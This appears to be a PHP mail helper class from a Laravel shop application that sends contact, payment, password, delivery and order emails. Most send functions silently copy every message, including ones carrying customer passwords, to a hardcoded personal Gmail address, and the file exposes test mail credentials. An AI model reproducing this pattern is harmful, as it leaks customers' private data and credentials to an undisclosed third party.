<?php
namespace App\Globals;

use App\Models\Tbl_item;
use App\Models\Tbl_item_code;
use App\Models\Tbl_item_code_invoice;
use App\Models\Tbl_mlm_slot;
use App\Models\Tbl_mlm_discount_card_log;
use App\Models\Tbl_customer;
use App\Models\Tbl_email_template;

use App\Globals\Mlm_voucher;
use App\Globals\Item;
use App\Globals\Item_code;
use App\Globals\Mlm_compute;

use Session;
use Carbon\Carbon;
use Validator;
use Mail;
use App\Globals\Settings;
use Config;
use File;
class Mail_global
{
	public static function mail($data, $shop_id, $from = null)
    {
        if ($from == "contact") 
        {
            Mail_global::contact_mail($data, $shop_id);
        }
        elseif($from == "payment")
        {
            Mail_global::payment_mail($data, $shop_id);
        }
        elseif($from == "password")
        { 
            Mail_global::password_mail($data, $shop_id);
        }
        elseif($from == "cod")
        {
            Mail_global::cod_mail($data, $shop_id);
        }
        elseif($from == "discount_card")
        {
            Mail_global::mail_discount_card($data, $shop_id);
        }
        else
        {
            Settings::set_mail_setting($shop_id);
            $data['mail_username'] = Config::get('mail.username');

            if(isset($data['template']->header_image))
            {
                if (!File::exists(public_path() . $data['template']->header_image))
                {
                    $data['template']->header_image = null;
                }
            }   
           
            // $data['Mail_a_driver'] = Config::get('mail.driver');
            // $data['Mail_a_host'] = Config::get('mail.host');
            // $data['Mail_a_port'] = Config::get('mail.port');
            // $data['Mail_a_username'] = Config::get('mail.username');
            // $data['Mail_a_password'] = Config::get('mail.password');
            // $data['Mail_a_encryption'] = Config::get('mail.encryption');

            try 
            {
                Mail::send('emails.full_body', $data, function ($m) use ($data) {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                    $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
                });

                Mail::send('emails.full_body', $data, function ($m) use ($data) {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);

                    $m->to('edwardguevarra2003@gmail.com', $data['mail_username'])->subject($data['mail_subject']);
                });
            }
            catch (\Exception $e) 
            {
                return json_encode($e);
            }
        }
    }
    public static function contact_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');
        try 
        {
            if ($data['mail_username'] == "ca457d75dd54c1") 
            {
                Mail::send('emails.contact', $data, function ($m) use ($data) 
                {
                    $m->from("3dbe60f6ea-1e5545@inbox.mailtrap.io", $_SERVER['SERVER_NAME']);
                    $m->to("3dbe60f6ea-1e5545@inbox.mailtrap.io", $data['mail_username'])->subject($data['mail_subject']);
                });
            }
            else
            {
                Mail::send('emails.contact', $data, function ($m) use ($data) 
                {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                    $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
                });

                Mail::send('emails.contact', $data, function ($m) use ($data) 
                {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                    $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
                });
            }
            
            $result = 1;
        } 
        catch (\Exception $e) 
        {
            $result = 0;
            // Mail_gobal::fail_email($e->getMessage);
        }

        return $result;
    }
    public static function payment_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');

        // try 
        // {
            if ($data['mail_username'] == "ca457d75dd54c1") 
            {
                Mail::send('emails.payment', $data, function ($m) use ($data) 
                {
                    $m->from("3dbe60f6ea-1e5545@inbox.mailtrap.io", $_SERVER['SERVER_NAME']);
                    $m->to("3dbe60f6ea-1e5545@inbox.mailtrap.io", $data['mail_username'])->subject($data['mail_subject']);
                });
            }
            else
            {
                Mail::send('emails.payment', $data, function ($m) use ($data) 
                {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                    $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
                });
                Mail::send('emails.payment', $data, function ($m) use ($data) 
                {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                    $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
                });
                $result = 1;
            }
        // } 
        // catch (\Exception $e) 
        // {
        //     dd($e->getMessage());
        //     $result = 0;
        //     // Mail_gobal::fail_email($e->getMessage);
        // }

        return $result;
    }
    public static function password_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');
        try 
        {
            Mail::send('emails.password', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
            });
            Mail::send('emails.password', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
            });
            $result = 1;
        } 
        catch (\Exception $e) 
        {
            // Mail_gobal::fail_email($e->getMessage);
            $result = 0; 
        }

        return $result;
    }
    public static function cod_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');
        try 
        {
            Mail::send('emails.cod', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
            });
            Mail::send('emails.cod', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
            });
            $result = 1;
        } 
        catch (\Exception $e) 
        {
            // Mail_gobal::fail_email($e->getMessage);
            $result = 0; 
        }

        return $result;
    }
    public static function mail_discount_card($discount_card_log_id)
    {
    	$data = [];
    	$data['discount_card'] = Tbl_mlm_discount_card_log::where('discount_card_log_id', $discount_card_log_id)->first();
    	$data['customer'] = Tbl_customer::where('customer_id', $data['discount_card']->discount_card_customer_holder)->first();
    	$data['customer_sponsor'] = Tbl_customer::where('customer_id', $data['discount_card']->discount_card_customer_sponsor)->first();
       Mail::send('emails.discount_card', $data, function ($m) use ($data) {
            $m->from(env('MAIL_USERNAME'), $_SERVER['SERVER_NAME']);

            $m->to($data['customer']->email, env('MAIL_USERNAME'))->subject('Discount Card');
        });
    }
    public static function create_email_content($data,$shop_id,$content_key = null)
    {
        $result = 0;
        if(EmailContent::checkIfexisting_shop_id($content_key,$shop_id) > 0) 
        {            
            $data["template"] = Tbl_email_template::where("shop_id", $shop_id)->first();
            if(isset($data['template']->header_image))
            {
                if (!File::exists(public_path() . $data['template']->header_image))
                {
                    $data['template']->header_image = null;
                }
            }   

            $return["subject"] = EmailContent::getSubject($content_key);
            $return["shop_key"] = EmailContent::getShopkey_front($shop_id);

            /* CASH ON DELIVERY */
            if($content_key == "cash_on_delivery")
            {                
                $txt["0"."cod"]["txt_to_be_replace"] = "[link]";
                $txt["0"."cod"]["txt_to_replace"] = "<a href='".$_SERVER["SERVER_NAME"]."' target='_blank'>LINK</a>";

                $txt["1"."cod"]["txt_to_be_replace"] = "[password]";
                $txt["1"."cod"]["txt_to_replace"] = $data["password"];
            }
            /* END CASH ON DELIVERY */

            /* SUCCESSFULLY ORDER */
            if($content_key == "successful_order")
            {       
                $data['mail_to'] = $data["order_details"]->customer_email;

                $txt["0"."s_o"]["txt_to_be_replace"] = "[order_number]";
                $txt["0"."s_o"]["txt_to_replace"] = sprintf("%06d",$data["order_details"]->ec_order_id);

                $txt["1"."s_o"]["txt_to_be_replace"] = "[order_date]";
                $txt["1"."s_o"]["txt_to_replace"] = $data["order_details"]->created_date;
                
                $txt["2"."s_o"]["txt_to_be_replace"] = "[order_status]";
                $txt["2"."s_o"]["txt_to_replace"] = $data["order_status"];
                
                $txt["3"."s_o"]["txt_to_be_replace"] = "[customer_name]";
                $txt["3"."s_o"]["txt_to_replace"] = $data["order_details"]->title_name." ".$data["order_details"]->first_name." ".$data["order_details"]->middle_name." ".$data["order_details"]->last_name;
                
                $txt["4"."s_o"]["txt_to_be_replace"] = "[email_address]";
                $txt["4"."s_o"]["txt_to_replace"] = $data["order_details"]->customer_email;
                
                $txt["5"."s_o"]["txt_to_be_replace"] = "[mobile_number]";
                $txt["5"."s_o"]["txt_to_replace"] = $data["order_details"]->customer_mobile;
                
                $txt["6"."s_o"]["txt_to_be_replace"] = "[payment_method]";
                $txt["6"."s_o"]["txt_to_replace"] =  $data["order_details"]->method_name;
                
                $txt["7"."s_o"]["txt_to_be_replace"] = "[shipping_address]";
                $txt["7"."s_o"]["txt_to_replace"] = $data["order_details"]->billing_address;

                $txt["8"."s_o"]["txt_to_be_replace"] = "[product_order_details]";
                $txt["8"."s_o"]["txt_to_replace"] = "<div style='width:100%'><table style='border-collapse: collapse; width:100%'><tr><th colspan='2' style='border-bottom:1px dashed #45f235'>Description</th><th style='border-bottom:1px dashed #45f235'>Item Price</th></tr>";

                foreach ($data["order_item"] as $key => $value) 
                {
                    $image_path = '<img style="height:100px;width:100px;object-fit:contain" src="<?php echo $m->embed('. url().$value->image_path.') ?>">';
                    $txt["8"."s_o"]["txt_to_replace"] .= "<tr><td style='text-align:left;width:20%;padding:5px'>".$image_path."</td><td style='text-align:left;width:50%;padding:20px'>".$value->evariant_item_label."</td><td style='text-align:center;width:30%;padding:20px'>".currency("PHP",$value->evariant_price)."</td></tr>";
                }
                $disc = Cart::get_coupon_discount($data["order_details"]->coupon_id);
                $txt["8"."s_o"]["txt_to_replace"] .= "<tr><td colspan='2' style='text-align:center;width:50%;padding:20px;border-top:1px dashed #45f235'><strong>Coupon Discount</strong></td><td style='text-align:center;width:50%;padding:20px;border-top:1px dashed #45f235'><strong>".currency("PHP",$disc)."</strong></td></tr><tr><td colspan='2' style='text-align:center;width:50%;padding:20px;border-top:1px dashed #45f235'><strong>TOTAL</strong></td><td style='text-align:center;width:50%;padding:20px;border-top:1px dashed #45f235'><strong>".currency("PHP",$data["order_details"]->total- $disc)."</strong></td></tr>";
                $txt["8"."s_o"]["txt_to_replace"] .= "</table></div>";


                $txt["9"."s_o"]["txt_to_be_replace"] = "[link]";
                $txt["9"."s_o"]["txt_to_replace"] = "<a style='background-color:#35acf1;padding:10px;color:#fff' target='_blank' href=".$_SERVER["SERVER_NAME"].">LOGIN TO CHECK YOUR TRACKING UPDATES</a>";
            }
            /* END SUCCESSFULLY ORDER */

            /* DELIVERED */
            if($content_key == "delivered")
            {            
                $data['mail_to'] = $data["order_details"]->customer_email;    
                $txt["0"."del"]["txt_to_be_replace"] = "[none]";
                $txt["0"."del"]["txt_to_replace"] = "";
            }
            /* END DELIVERED */

            /* SUCCESS REGISTER */  
            if($content_key == "success_register")
            {            
                $data['mail_to'] = $data["customer_info"]->email;    
                $txt["0"."s_r"]["txt_to_be_replace"] = "[name]";
                $txt["0"."s_r"]["txt_to_replace"] = $data["customer_info"]->title_name." ".$data["customer_info"]->first_name." ".$data["customer_info"]->middle_name." ".$data["customer_info"]->last_name;

                $txt["1"."s_r"]["txt_to_be_replace"] = "[link]";
                $txt["1"."s_r"]["txt_to_replace"] = "<a style='text-decoration:none;background-color:#35acf1;padding:10px;color:#fff' target='_blank' href=".$_SERVER["SERVER_NAME"].">SHOP NOW</a>";

            }
            /* END SUCCESS REGISTER */

            if (isset($txt)) 
            {
                $change_content = $txt;
                $return["content"] = EmailContent::email_txt_replace($content_key, $change_content, $shop_id);

                $result = Mail_global::send_email($data['template'], $return, $shop_id, $data['mail_to']);
            }
        }

        return $result;
    }
    public static function send_email($email_template, $email_content, $shop_id, $email_address)
    {
        $result = 0;
        if($email_address != "")
        {
            Settings::set_mail_setting($shop_id);

            $data["mail_to"]       = $email_address;
            $data["template"]      = $email_template;
            $data["subject"]       = $email_content["subject"];
            $data["body"]          = $email_content["content"];
            $data['mail_username'] = Config::get('mail.username');

            try 
            {
                if ($data['mail_username'] == "ca457d75dd54c1") 
                {
                    Mail::send('emails.full_body', $data, function ($m) use ($data) 
                    {
                        $m->from("edward@edward.com", $_SERVER['SERVER_NAME']);
                        $m->to($data["mail_to"], $data['mail_username'])->subject($data["subject"]);
                    });
                }
                else
                {
                    Mail::send('emails.full_body', $data, function ($m) use ($data) 
                    {
                        $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                        $m->to($data["mail_to"], $data['mail_username'])->subject($data["subject"]);
                    });
                }
                
                $result = 1;
            } 
            catch (\Exception $e) 
            {
                $result = 0; 
            }
        }       

        return $result;

    }
    public static function fail_email($x)
    {
        dd($x);
    }
}